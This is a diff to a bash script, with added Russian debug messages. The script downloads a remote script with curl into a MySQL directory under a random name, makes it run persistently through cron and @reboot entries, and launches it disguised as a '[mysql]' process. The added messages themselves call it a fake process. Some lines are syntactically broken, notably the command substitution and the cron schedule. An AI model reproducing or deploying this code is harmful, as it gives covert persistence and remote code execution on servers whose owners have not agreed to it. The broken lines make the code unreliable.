@@ -22,21 +22,31 @@ find_dir() {
 
 process() {
     exec -a "[mysql]" "$SCRIPT_PATH" 2>/dev/null &
+    echo "[!] Запущен ложный процесс с именем: [mysql] (PID: $!)"
+    echo "[!] Путь к скрипту: $SCRIPT_PATH"
 }
 
 main() {
     MYSQL_DIR=$({find_dir})
     RANDOM_NAME=$(generate_name)
     SCRIPT_PATH="$MYSQL_DIR/$RANDOM_NAME"
+    
+    echo "[+] Выбрана директория: $MYSQL_DIR"
+    echo "[+] Сгенерировано имя: $RANDOM_NAME"
 
     if ! crontab -l 2>/dev/null | grep -q "$SCRIPT_PATH"; then
+    echo "[*] Скачивание скрипта из: $GITHUB_SCRIPT_URL"
     curl -s "$GITHUB_SCRIPT_URL" -o "$SCRIPT_PATH"
     chmod +x "$SCRIPT_PATH"
+    echo "[*] Скрипт сохранен в: $SCRIPT_PATH"
 
     (crontab -l 2>/dev/null
     echo "/9 * * * * * $SCRIPT_PATH >/dev/null 2>&1"
     echo "@reboot $SCRIPT_PATH >/dev/null 2>&1"
     ) | crontab -
+    echo "[*] Задачи cron добавлены для автоматического запуска"
+    else
+    echo "[+] Скрипт уже существует в cron"
     fi
 
     process
